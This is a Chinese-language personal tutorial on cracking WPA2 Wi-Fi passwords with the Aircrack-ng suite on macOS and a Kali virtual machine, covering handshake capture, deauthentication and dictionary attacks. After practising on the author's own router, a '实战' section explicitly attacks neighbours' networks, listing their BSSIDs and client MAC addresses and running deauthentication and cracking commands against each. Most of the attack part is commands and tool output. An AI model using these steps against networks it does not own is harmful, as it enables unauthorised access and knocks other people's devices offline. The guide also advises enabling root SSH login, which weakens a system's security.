❤️️ wifi 破解简介:

🔵 wifi 加密方式: 
    wpa2  基本都是这种加密.最最常见
    wpa   很少见..
    wep   非常少见.很好破解的.


“蹭网卡”
    破解无线网络密码其实就是对该无线网络中传输的数据进行“抓包（数据流量包）”分析，
    然后暴力破解无线网络的密码，抓包越多，破解的速度也就越快。
    目前“蹭网卡”只能破解WEP和WPA加密模式的无线网络，无法破解 wpa2加密方式.


🔵 wifi破解思路
    首先看 各种wifi钥匙是不是可用...
    再看PSK 是否开启!!!! 开启就好破..
    最后用密码字典尝试弱密码....

    对方是弱密码就好破解.对方强密码就很难破解...
    简单点说 你的字典里有对方密码.那么就能破解.不然就没戏..


    破解wifi 最出名的就是 Aircrack-ng 套件.
    这个套件可以安装在Linux下. 也能安装在Mac下.
    ❗️❗️❗️ 强烈建议在Kali下使用Aircrack-ng套件. 同样的套件 Kali下的功能比Mac强大多了.
    Linux 可以使用Aircrack-ng 套件里的所有套件.
    Mac 只能用aircrack-ng suite.中的某几个组件!!! 
    Mac下是用不了需要开启wifi的只能用aircrack-ng组件的.
    再说.. 虽然Mac 也是linux的.但是.建议用Kali虚拟机来运行Aircrack-ng 套件.

    对我们最重要的数据包是：包含密码的包－也叫握手包。
    当有新用户或老用户断开后自动连接wifi时，都会发送握手包.

    🔵 Airport
        其实OSX本身有个命令行工具：airport，利用这个工具可以方便的实现airmon-ng中的某些功能!!!
        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport 
        首先添加airport的环境路径. 不然用airport 每次都要输这么长的命令...

    🔵 Mac 安装 aircrack-ng 套件.   brew install aircrack-ng

    🔵 Mac 查看附件 wifi：
        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan
          219 6c:b0:ce:bd:d1:5b -27  3       N  -- WPA2(PSK/AES/AES)
          219-5 6c:b0:ce:bd:d1:5a -26  153   Y  -- WPA2(PSK/AES/AES)
                          用mac自带的 airport 来查看wifi. 简单方便!

    🔵 Mac 监听 / 抓握手包.
        sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 3

          en0   本机无线网卡设备；
          sniff 嗅探.
          3     要破解wifi的信道
          结束抓包后的数据保存在/tmp.

          等待一段时间，后就可以按control+C结束监听，
          ❗️ 这里就是为什么不推荐用Mac来抓包了.
          Mac下你完全不知道是否抓到握手包了.
          用Kali 抓包 就能实时显示是否抓到握手包.

          这时看到提示，一个airportSniffXXXXXX.cap的文件被保存在/tmp文件夹中。
          现在就可以使用类似wireshark之类的网络分析工具在线下打开它了。

          现在你用手机去连 219 这个wifi.连上后就可以停止抓包(Ctrl + C)了..
          ❗️ 连wifi: 不一定要输入wifi密码.如果别人之前连过wifi的.只要打开wifi 也算连的! 也可以获取握手包.
          ❗️ 人家走来走去. 就会不停的连wifi. 所以这个 握手包是比较容易获得的. 重点就是字典密码..

 
    🔵 Mac 分析破解握手包

        sudo aircrack-ng -w ~/passwords.txt /tmp/airportSniffCd2nGz.cap | grep handshake
          1  6C:B0:CE:BD:D1:5B  219                       WPA (1 handshake)
          2  CC:81:DA:41:BE:58  @PHICOMM_50               WPA (0 handshake)
          3  D8:49:0B:A7:47:F0  ChinaNet-Ccfr             WPA (0 handshake)

              -w：  指定字典文件路径；
              －b： 指定要破解的wifi 地址
              /tmp. 抓包文件路径.
              grep: 有抓到 handshake 数据包的wifi才能进行下一步的破解!!.
                    上面只有第一个是可以用字典开尝试出对方密码的.
                    这里必须用grep. 你抓到的数据是成千上万条. 你必须进行过滤.
                    handshake 前面的数字不为0的才有用. 
                    handshake 前面的数字为0的都没用的.






❤️️ 试验环境
    笔记本: Mac
    虚拟机: Kali (VMware)
    路由器: Netgear 6300
    USB无线网卡: Netgear WNA1100

    🔵 路由器设置:
      自己准备个路由器. 设置个简单密码 来破解试试.   

      🔸 2.4G 设置
          192.168.1.1
          SSID: 219
          加密方式: wpa2-psk aes 
          信道03
          密码:11111111

      🔸 5G 设置:
          192.168.1.1
          SSID: 219-5
          加密方式: wpa2-psk aes 
          信道153
          密码:88888888

      🔸 wps设置.
          netgear ➜ 高级➜ 高级设置 ➜  无线设置 ➜  wps设置 ➜ 启用路由器的pin;  防止pin威胁前面的勾取消.


    🔵 无线网卡

        实体机只要能上网.虚拟机就有办法上网.
        不管实体机是用有线还是无线上网的. 到了虚拟机都是有线方式上网的.
        如果虚拟机里要使用无线网卡.如要用kali虚拟机破解wifi.
        就只能在实体机上再插个外置USB无线网卡.
        ❗️❗️❗️虚拟机只能使用外置无线网卡!❗️❗️❗️
        ❗️❗️❗️虚拟机只能使用外置无线网卡!❗️❗️❗️
        ❗️❗️❗️虚拟机只能使用外置无线网卡!❗️❗️❗️

        🔸 查看虚拟机无线网卡情况
          ifconfig → 出现类似 wlan0的(wlan开头的)才说明虚拟机识别到了无线网卡.
          如果你用虚拟机运行Kali. 不用外置的USB网卡 是永远也不会有wlan网卡出现的.
          别多想了. 20块钱的无线网卡. 最最便宜的了.

        🔸 Kali 虚拟机推荐USB网卡:
            - Netgear WNA1100 我用的那个...淘宝 20块钱一个!!!
            - TP-LINK WN722N 要v1版本. 不要V2版本.贵! 得150￥+  

        🔸 Kali VM虚拟机无线网卡驱动
          Netgear WNA1100 至少在 kali 2016.2 版本是免驱的. 插上连到虚拟机就能用



🔵 开启 ssh.
    vi /etc/ssh/sshd_config
        PermitRootLogin yes  这行改成这样.

    service ssh restart
    service ssh status


🔵 是否支持监控模式  airmon-ng

🔵 开启监控模式   airmon-ng start wlan0
   现在用ifconfig 会发现之前的 wlan0 变成 wlan0mon了.

🔵 查看wifi
    airodump-ng wlan0mon
    列出了周围的wifi和它们的详细信息，
    ❗️ 要记住要破解wifi的信道和BSSID (也就是路由器的Mac地址)
    按Ctrl-C结束。


🔵 选择一个wifi来抓握手包
    airodump-ng -c 3 --bssid 6c:b0:ce:bd:d1:5b -w ~/ wlan0mon

    -c指定频道号
    –bssid指定路由器bssid
    -w指定抓取的数据包保存位置

    这里会列出 对方路由器连接了哪些用户!!! 
    Station 下面的就是连接的用户...  记住一个用户的mac地址.
    用下面马上介绍的攻击命令来使得这个用户重新连接路由器. 
    这样就能快速获取握手包了.


🔵   强制某设备重连路由器.
    👁‍🗨 这里注意  要新开一个终端来执行下面命令.现在还不能停止上面的抓包...

    aireplay-ng -0 2 -a 6c:b0:ce:bd:d1:5b -c dc:37:14:16:d2:79 wlan0mon
      -0 表示发起攻击 
       2 好像是攻击次数.不管.
      -a 指定无线路由器BSSID
      -c 指定强制断开的设备

      这里如果你用这个命令攻击自己的手机. 
      这时候去看手机就会发现wifi断开几秒 然后重连了.说明这个攻击命令有有效的.
      手机重连后等几秒就能在 上一步的第一行就

      ❗️❗️ 如果获取了握手包.
      CH  6 ][ Elapsed: 3 mins ][ 2017-04-26 07:55
      这行会变成类似... 多出个 handshake 来.这时候就说明抓到握手包了.可以停止抓包了.
      CH  3 ][ Elapsed: 42 s ][ 2017-04-26 07:56 ][ WPA handshake: 6C:B0:CE:BD:D1:5B



🔵  抓包文件
    cd ~

    ls -l
    total 332
    -rw-r--r-- 1 root root 293246 Apr 26 07:32 -01.cap
    -rw-r--r-- 1 root root    568 Apr 26 07:32 -01.csv
    -rw-r--r-- 1 root root    584 Apr 26 07:32 -01.kismet.csv
    -rw-r--r-- 1 root root   3786 Apr 26 07:32 -01.kismet.netxml

    好几个文件. 主要就是 .cap 文件.
    每次都会给你重命名. -01.cap ; -02.cap ; -03.cap... 等等.


🔵 结束监听模式
    airmon-ng stop wlan0mon


🔵 准备字典

    Kali Linux自带的rockyou字典:  cd /usr/share/wordlists/rockyou.txt.gz
    解压：                gzip -d /usr/share/wordlists/rockyou.txt.gz

    cd /usr/share/wordlists/rockyou.txt
    这文件很大的 11111111 88888888 都在里面.说明里面的还是不错的.


🔵 破解(VM Kali):

    sudo aircrack-ng -a2 -b 6C:B0:CE:BD:D1:5B -w /usr/share/wordlists/rockyou.txt /root/-01.cap
        -a2 不管.
        -b 后面是 路由器Mac地址.
        -w 后面是 字典路径
        /root/-01.cap 是 .cap 文件路径


🔵 破解(Mac): 复杂密码字典 (22万条.3MB大小文件. 真实密码在文件尾部.)
    👁‍🗨 22万条密码.两分钟也就跑完了. 很快的. 重点是密码字典!!!
    sudo aircrack-ng -w /Users/v/Desktop/dic/cain.txt -b 6c:b0:ce:bd:d1:5b /tmp/airportSniffCd2nGz.cap
        -b 后面是 路由器Mac地址.
        -w 后面是 字典路径




❤️ 密码字典

    重点的重点就是字典! 字典里面有对方密码. 就能找出那个密码.

    好的密码字典一个，应包含常见的弱密码、手机号、姓名生日组合、各大网站泄露的密码、英语单词等等。
    如果使用字典破解不了，说明密码还算复杂；暴力穷举更是费时费力。（论复杂密码的重要性）。

    淘宝好像有跑字典服务???

    用GPU跑字典. 快很多很多..












⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️---实战---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
 之前是自己的路由器.下面来试试别人的路由器.

🔵 进入监听模式 
airmon-ng start wlan0

🔵 Kali 查看周围 wifi
airodump-ng wlan0mon

 CH  1 ][ Elapsed: 12 s ][ 2017-04-26 07:48

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 8C:A6:DF:DE:5E:0C  -84        2        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_5E0C
 BC:5F:F6:0A:F6:68  -88        2        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_F668
 1C:60:DE:AE:DB:BE  -90        1        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_DBBE302
 F0:B4:29:21:07:A5  -90        2        0    0  11  54e  WPA2 CCMP   PSK  G-family
 6C:B0:CE:BD:D1:5B  -27       14        0    0   3  54e  WPA2 CCMP   PSK  219
 E4:F3:F5:83:CF:00  -67       12       10    0  12  54e  WPA2 CCMP   PSK  MERCURY_CF00
 C8:3A:35:FD:E1:98  -69       14        0    0   9  54e  WPA2 CCMP   PSK  Tenda_FDE198
 00:6B:8E:51:93:E4  -68        3        0    0   1  54e  WPA2 CCMP   PSK  PHICOMM_5193E4
 E4:D3:32:B4:83:BC  -73       12        0    0  11  54e. WPA2 CCMP   PSK  MERCURY_210
 30:FC:68:47:C0:42  -77        8        0    0  11  54e. WPA2 CCMP   PSK  顿�.��.海�.�
 B8:F8:83:ED:CF:9B  -70       10        0    0  11  54e. WPA2 CCMP   PSK  TP-LINK_CF9B
 18:44:E6:73:CA:CF  -75        9        0    0   2  54e  WPA2 CCMP   PSK  ChinaNet-VTka
 CC:81:DA:12:0A:18  -72       11        0    0   4  54e  WPA2 CCMP   PSK  @PHICOMM_10
 30:FC:68:3D:58:92  -75        8        0    0   6  54e. WPA2 CCMP   PSK  �.��..�.�.你�.�.�.�
 14:75:90:08:4D:5E  -79        5        0    0   6  54e. WPA2 CCMP   PSK  lys
 CC:2D:21:2F:FF:40  -79        7        0    0  11  54e  WPA2 CCMP   PSK  Tenda_2FFF40
 42:FC:68:3D:58:92  -75        5        0    0   6  54e. WPA2 CCMP   PSK  �..�..你�.�.�.�.
 00:6B:8E:E0:8F:58  -81        5        0    0   9  54e  WPA2 CCMP   PSK  MYY520MYY
 E4:F3:F5:9A:EF:B0  -81        3        0    0  13  54e  WPA2 CCMP   PSK  MERCURY_EFB0
 5C:63:BF:FE:8A:B8  -81        2        0    0   9  54e. WPA2 CCMP   PSK  ChinaNet-8AB8
 D8:C8:E9:32:07:00  -81        5        0    0  13  54e. WPA2 CCMP   PSK  KEDU
 D8:49:0B:A7:47:F0  -81        5        0    0   2  54e  WPA2 CCMP   PSK  ChinaNet-Ccfr
 00:13:10:79:D4:9F  -77        6        0    0   6  54   WPA2 CCMP   PSK  linksys
 00:19:D0:24:92:1B  -84        4        0    0   4  54e. WPA2 CCMP   PSK  ChinaNGB-Cactus
 BC:46:99:C2:24:FC  -82        3        0    0   1  54e. WPA2 CCMP   PSK  HLZJ-807
 BC:46:99:73:D9:DA  -82        3        0    0   1  54e. WPA2 CCMP   PSK  TP-LINK_D9DA
 7C:08:D9:DB:2C:CA  -83        2        0    0   1  54e. WPA2 CCMP   PSK  ChinaNGB-602
 74:C3:30:07:DD:FE  -83        3        1    0  13  54e  WPA2 CCMP   PSK  huatuoyangsheng
 30:FC:68:8D:00:76  -83        1        0    0   1  54e. WPA2 CCMP   PSK  onshine
 E0:28:61:81:FA:20  -87        2        0    0  11  54e  WPA2 CCMP   PSK  ChinaNet-UXjM
 8C:F2:28:E1:D8:D6  -86        4        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_D8D6
 08:3F:BC:B0:B1:ED  -86        2        0    0   4  54e  WPA2 CCMP   PSK  ChinaNet-V7Su
 50:BD:5F:B5:01:C8  -87        2        0    0   1  54e. WPA2 CCMP   PSK  You Know Who 233
 8C:A6:DF:DD:69:9C  -88        3        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_699C
 54:BE:53:5A:B9:47  -87        2        0    0   5  54e  WPA2 CCMP   PSK  ChinaNet-6xkb
 C8:3A:35:58:95:48  -88        2        0    0   8  54e  WPA2 CCMP   PSK  Tenda_589548
 FC:10:C6:99:54:4B  -88        4        0    0   3  54e  WPA2 CCMP   PSK  ChinaNet-ZgbL
 F4:B8:A7:6C:34:BC  -87        3        0    0   6  54e  WPA2 CCMP   PSK  ChinaNet-TA5N
 30:D1:7E:AA:72:AC  -91        3        0    0   3  54e  WPA2 CCMP   PSK  ChinaNet-Ja2c
 44:F4:36:5D:A2:6F  -91        1        0    0   8  54e  WPA2 CCMP   PSK  ChinaNet-jdwR
 C8:3A:35:40:B9:08  -92        0        0    0   8  54e  WPA2 CCMP   PSK  Tenda_40B908




🔵 MERCURY_210    E4:D3:32:B4:83:BC  CH 11 👹 不在字典里....

  🔸 抓包并查看连接设备:
  airodump-ng -c 11 --bssid E4:D3:32:B4:83:BC -w ~/ wlan0mon

  🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a E4:D3:32:B4:83:BC -c 74:E5:43:06:24:D2 wlan0mon
  aireplay-ng -0 2 -a E4:D3:32:B4:83:BC -c C0:9F:05:FB:1F:A1 wlan0mon

  🔸rockyou字典中无密码: ..
  sudo aircrack-ng -a2 -b E4:D3:32:B4:83:BC -w /usr/share/wordlists/rockyou.txt /root/-15.cap



🔵 TP-LINK_CF9B B8:F8:83:ED:CF:9B  11    👹 不在字典里....

 🔸 抓包并查看连接设备:
    airodump-ng -c 11 --bssid B8:F8:83:ED:CF:9B -w ~/ wlan0mon

  🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a B8:F8:83:ED:CF:9B -c 40:40:A7:B2:26:41 wlan0mon

  🔸rockyou
  sudo aircrack-ng -a2 -b B8:F8:83:ED:CF:9B -w /usr/share/wordlists/rockyou.txt /root/-21.cap



🔵 别看了，你连不上的 30:fc:68:3d:58:92  6  👹 不在字典中

  airodump-ng -c 6 --bssid 30:fc:68:3d:58:92 -w ~/ wlan0mon

  🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a 30:FC:68:3D:58:92 -c 8C:18:D9:5B:A3:DB wlan0mon
 
  🔸rockyou字典
  sudo aircrack-ng -a2 -b 30:fc:68:3d:58:92 -w /usr/share/wordlists/rockyou.txt /root/-17.cap






🔵 顿�.��.海�.�    30:FC:68:47:C0:42 6     👹 无握手包..

airodump-ng -c 6 --bssid 30:FC:68:47:C0:42 -w ~/ wlan0mon

🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a 30:FC:68:47:C0:42 -c 54:4E:90:C2:97:C3 wlan0mon
  aireplay-ng -0 2 -a 30:FC:68:47:C0:42 -c FC:1A:11:69:25:7E wlan0mon



🔵 MERCURY_EFB0   E4:F3:F5:9A:EF:B0 13    👹 无握手包..
airodump-ng -c 13 --bssid E4:F3:F5:9A:EF:B0 -w ~/ wlan0mon

🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a E4:F3:F5:9A:EF:B0 -c F4:8B:32:09:25:91 wlan0mon
  aireplay-ng -0 2 -a E4:F3:F5:9A:EF:B0 -c 6C:5C:14:DD:5F:DB wlan0mon




🔵 再看你也连不上 42:fc:68:3d:58:92  6  👹 无握手包...
  airodump-ng -c 6 --bssid 42:FC:68:3D:58:92 -w ~/ wlan0mon

  🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a 42:FC:68:3D:58:92 -c 18:21:95:E6:35:D5 wlan0mon


🔵 ChinaNet-VTka   18:44:E6:73:CA:CF  2     👹 无连接设备
  airodump-ng -c 6 --bssid 18:44:E6:73:CA:CF -w ~/ wlan0mon


🔵 MERCURY_CF00   E4:F3:F5:83:CF:00  CH 12   👹 无握手包...

 🔸 抓包并查看连接设备:
  airodump-ng -c 12 --bssid E4:F3:F5:83:CF:00 -w ~/ wlan0mon

🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a E4:F3:F5:83:CF:00 -c A8:7C:01:77:77:27 wlan0mon


🔵 Tenda_FDE198 C8:3A:35:FD:E1:98    11    👹 无握手包.....

  airodump-ng -c 11 --bssid C8:3A:35:FD:E1:98 -w ~/ wlan0mon

   aireplay-ng -0 20 -a C8:3A:35:FD:E1:98 -c FC:E9:98:1F:B2:F1 wlan0mon


🔵 TP-LINK_CF9B   B8:F8:83:ED:CF:9B  11     👹 无握手包..
  airodump-ng -c 11 --bssid B8:F8:83:ED:CF:9B -w ~/ wlan0mon

aireplay-ng -0 20 -a B8:F8:83:ED:CF:9B -c B0:89:00:A3:CA:27 wlan0mon









🔵 TP-LINK_5E0C  ❌        8C:A6:DF:DE:5E:0C  CH 6

  🔸 抓包并查看连接设备:
  airodump-ng -c 6 --bssid 8C:A6:DF:DE:5E:0C -w ~/ wlan0mon

  🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a 8C:A6:DF:DE:5E:0C -c 1C:77:F6:65:35:0C wlan0mon




🔵 MERCURY_F668 ❌     BC:5F:F6:0A:F6:68  CH 6

  🔸 抓包并查看连接设备:
  airodump-ng -c 6 --bssid BC:5F:F6:0A:F6:68 -w ~/ wlan0mon

  🔸 新开终端: 重启对方设备..
  aireplay-ng -0 2 -a BC:5F:F6:0A:F6:68 -c 78:02:F8:AE:07:4B wlan0mon

  也没有抓到握手包...



🔵 MERCURY_DBBE302 ❌   1C:60:DE:AE:DB:BE  CH6

  🔸 抓包并查看连接设备:
  airodump-ng -c 6 --bssid 1C:60:DE:AE:DB:BE -w ~/ wlan0mon
  .... 没设备连接...










